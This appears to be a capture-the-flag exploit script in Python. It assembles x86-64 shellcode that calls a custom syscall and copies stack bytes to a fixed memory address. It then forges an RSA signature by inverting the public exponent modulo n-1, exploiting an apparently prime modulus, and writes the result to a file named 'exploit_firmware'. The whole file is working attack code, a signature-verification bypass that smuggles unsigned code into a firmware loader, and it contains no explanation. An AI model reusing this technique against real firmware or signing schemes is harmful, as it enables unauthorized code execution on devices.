from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes
import hashlib
import os
import keystone as ks

context.bits = 64
context.arch = "amd64"

ksa = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_64)

asm_code = """
sub rsp, 0x1000

mov rax, 0xC89FC
mov rdi, rsp
syscall

mov rsi, 0x10080000
mov rdx, 0x0

loop_start:
cmp rdx, 0x100
je dick
mov al, BYTE PTR [rsp + rdx]
mov BYTE PTR [rsi + rdx], al
inc rdx
jmp loop_start

dick:
jmp dick

exit:
mov rax, 0x3c
xor rdi, rdi
xor rsi, rsi
syscall
"""

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    g, y, x = egcd(b%a,a)
    return (g, x - (b//a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('No modular inverse')
    return x%m

def sha_hash(a):
	m = hashlib.sha256()
	m.update(a)
	return bytes_to_long(m.digest()[::-1])

n_orig = b'\x0f\xff\x0e\xe9E\xbdAv\xf5Z@T;6f\x84:\rV\\3\x9e]\x89i\xfc\xd7\xca\x92\x1c\xc3\x03\xa1\xc8\xaf\x16$\x0cM\x03-\x191c+\x90\x99m\xd4\x8a\xeb\xac\xee0}<W\xbc\x837V\x98\xae}\xf9\r\x10\x16>\xde\xe9\xe0g\xceF\xe78\t"W\xda\xfb\x15\xb8\x0f\xb6Ya\x90\r\xef\xfa\x9bY\xb5~G+\xf5k\xe0\xd9\xf6H\xadi\x08\xf2U;\xe1:\x9e\xa0\xcd\xa2C\x17ul\xbaQB\xa9^!\xf9\xe0'
n = 45104609027519879966117529429338006626798028994389117924158495136709397011501567227664950318965273123782487589620779463195674090263030208497530994733903332167645033180565662692208490832121519228785954077085911116453507113306791254438988891772601257924832645335248158443321386010405772557085152093707985187077817314837591994628232691127712941311414697743
n_bytes = long_to_bytes(n)[::-1]

d = modinv(0x10001, n - 1)

asm_bytes = asm(asm_code)
sha256_hash = sha_hash(asm_bytes)
signature = long_to_bytes(pow(sha256_hash, d, n))[::-1]

code_chunk = p32(len(asm_bytes))
code_chunk += chr(len(n_bytes)) + n_bytes + "\x00"*(0xff-len(n_bytes))
code_chunk += signature + "\x00"*(0x100 - len(signature))
code_chunk += asm_bytes

with open("exploit_firmware", "w") as f:
	f.write(code_chunk)
